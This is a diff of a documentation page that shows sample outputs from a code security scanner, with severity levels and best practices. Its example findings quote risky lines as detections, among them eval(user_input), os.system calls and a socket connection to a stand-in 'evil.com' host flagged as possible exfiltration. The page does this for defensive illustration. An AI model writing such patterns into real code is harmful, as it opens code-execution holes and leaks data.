@@ -1,43 +1,96 @@
-# Example Scan Results
+# Security Scan Results Documentation
 
-## Clean File Scan
-```
-[INFO] Scanning: clean_example.py
+## Overview
+This document demonstrates various security scan outputs and their interpretations.
+
+## Scan Result Types
+
+### 1. Clean File Scan
+```shell
+✅ [INFO] Scanning: clean_example.py
+------------------------
 Files Scanned: 1
 Issues Found: 0
 Scan Time: 0.2s
-No suspicious patterns detected
+Status: CLEAN
 ```
 
-## Suspicious File Scan
+### 2. Suspicious File Scan
+```shell
+⚠️ [WARNING] Scanning: suspicious_example.py
+------------------------
+HIGH SEVERITY ISSUES:
+  • Code Execution Risk
+    - Line 12: eval('print("hello")')
+    - Impact: Potential arbitrary code execution
+    
+  • System Command Injection
+    - Line 15: os.system('dir')
+    - Impact: Unauthorized system access
+    
+  • Suspicious Network Activity
+    - Line 23: socket.connect(('evil.com', 80))
+    - Impact: Possible data exfiltration
+
+Summary:
+- Files Scanned: 1
+- Issues Found: 3 (2 High, 1 Medium)
+- Scan Time: 0.3s
+- Status: SUSPICIOUS
 ```
-[WARNING] Potential code execution found in suspicious_example.py:
-eval('print("hello")')
 
-[WARNING] System command execution found in suspicious_example.py:
-os.system('dir')
+### 3. Folder Scan
+```shell
+📁 [INFO] Starting folder scan: /project/src
+------------------------
+Results by File:
 
-[WARNING] Network activity found in suspicious_example.py:
-socket.connect(('evil.com', 80))
+network.py:
+  ⚠️ MEDIUM SEVERITY
+  • Unvalidated Network Request
+    - Line 45: requests.get('http://example.com')
+    - Recommendation: Validate URLs and use HTTPS
 
-Files Scanned: 1
-Issues Found: 3
-Scan Time: 0.3s
+utils.py:
+  ⚠️ HIGH SEVERITY
+  • Unsafe Code Execution
+    - Line 78: eval(user_input)
+    - Recommendation: Use safe parsing alternatives
+
+config.py: ✅ Clean
+helpers.py: ✅ Clean
+
+Summary:
+- Files Scanned: 4
+- Issues Found: 2 (1 High, 1 Medium)
+- Clean Files: 2
 ```
 
-## Folder Scan
-```
-[INFO] Starting folder scan: /project/src
-[WARNING] Network activity found in network.py:
-requests.get('http://example.com')
+## Severity Levels
+| Level | Description | Visual Indicator |
+|-------|-------------|------------------|
+| High | Critical security risks | 🔴 |
+| Medium | Potential vulnerabilities | 🟡 |
+| Low | Minor concerns | 🟢 |
+| Clean | No issues detected | ✅ |
 
-[WARNING] Code execution found in utils.py:
-eval(user_input)
+## Best Practices
+1. **Issue Resolution**
+   - Address high-severity issues immediately
+   - Document any false positives
+   - Implement security controls
 
-[INFO] No issues found in config.py
-[INFO] No issues found in helpers.py
+2. **Scan Configuration**
+   - Run scans pre-commit
+   - Configure custom rules
+   - Maintain allowlists for approved patterns
 
-Files Scanned: 4
-Issues Found: 2
-Scan Time: 1.2s
-```
+3. **Reporting**
+   - Export results in JSON/CSV
+   - Integrate with CI/CD pipelines
+   - Track issue trends over time
+
+## Notes
+- Results should be reviewed by security teams
+- False positives should be documented
+- Regular scans recommended
